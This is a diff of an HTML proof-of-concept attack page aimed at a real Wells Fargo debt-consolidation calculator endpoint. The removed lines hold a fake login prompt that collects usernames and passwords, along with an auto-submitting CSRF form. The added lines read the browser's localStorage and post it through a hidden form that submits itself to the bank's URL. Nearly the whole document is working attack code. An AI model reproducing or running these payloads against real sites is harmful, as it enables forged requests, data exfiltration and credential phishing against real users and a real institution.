@@ -15,46 +15,27 @@
         // Capture the data in a variable
         var capturedData = JSON.stringify(localStorageData);
 
-        // Capture the document.domain
-        var documentDomain = document.domain;
-
-        // Combine captured data and document.domain
-        var allCapturedData = {
-          localStorageData: capturedData,
-          documentDomain: documentDomain
-        };
-
         // Display the captured data in an alert
-        alert('Captured Data: ' + JSON.stringify(allCapturedData));
+        alert('LocalStorage Data: ' + capturedData);
 
-        // Prompt for username and password in a fake login
-        var username = prompt("Enter your username:");
-        var password = prompt("Enter your password:");
+        // Now we target the Wells Fargo form and submit it with the captured data
+        var form = document.createElement("form");
+        form.action = "https://www.wellsfargo.com/personal-loans/debt-consolidation-calculator/";
+        form.method = "POST";
 
-        // Display captured data along with the fake credentials
-        alert("Fake Login - Username: " + username + ", Password: " + password + "\nCaptured Data: " + JSON.stringify(allCapturedData));
+        // Add hidden input fields for localStorage data
+        var input = document.createElement("input");
+        input.type = "hidden";
+        input.name = "capturedLocalStorage";
+        input.value = capturedData;
+        form.appendChild(input);
+
+        // Submit the form
+        document.body.appendChild(form);
+        form.submit();
       } else {
         alert('No data in localStorage!');
       }
     </script>
-
-    <!-- Your CSRF form here -->
-    <form action="https://www.wellsfargo.com/personal-loans/debt-consolidation-calculator/" enctype="application/x-www-form-urlencoded" id="xsrfprobe_csrfpoc" method="POST">
-      <input name="debtConCalcDetailsCommandList[0].apr" type="hidden" value="https://www.wellsfargo.com/https://www.wellsfargo.comh1testing"/>
-      <input name="debtConCalcDetailsCommandList[0].currentBalance" type="hidden" value=""/>
-      <input name="debtConCalcDetailsCommandList[0].monthlyPayment" type="hidden" value="1000"/>
-      <input name="debtConCalcDetailsCommandList[1].apr" type="hidden" value="100"/>
-      <input name="debtConCalcDetailsCommandList[1].currentBalance" type="hidden" value="1000000"/>
-      <input name="debtConCalcDetailsCommandList[1].monthlyPayment" type="hidden" value="100"/>
-      <input name="debtConCalcDetailsCommandList[2].apr" type="hidden" value="100000"/>
-      <input name="debtConCalcDetailsCommandList[2].currentBalance" type="hidden" value="10000000"/>
-      <input name="debtConCalcDetailsCommandList[2].monthlyPayment" type="hidden" value="100"/>
-      <input name="debtConCalcDetailsCommandList[3].apr" type="hidden" value="0"/>
-      <input name="debtConCalcDetailsCommandList[3].currentBalance" type="hidden" value="010"/>
-      <input name="debtConCalcDetailsCommandList[3].monthlyPayment" type="hidden" value="10"/>
-    </form>
   </body>
-  <script>
-    document.getElementById("xsrfprobe_csrfpoc").submit();
-  </script>
 </html>
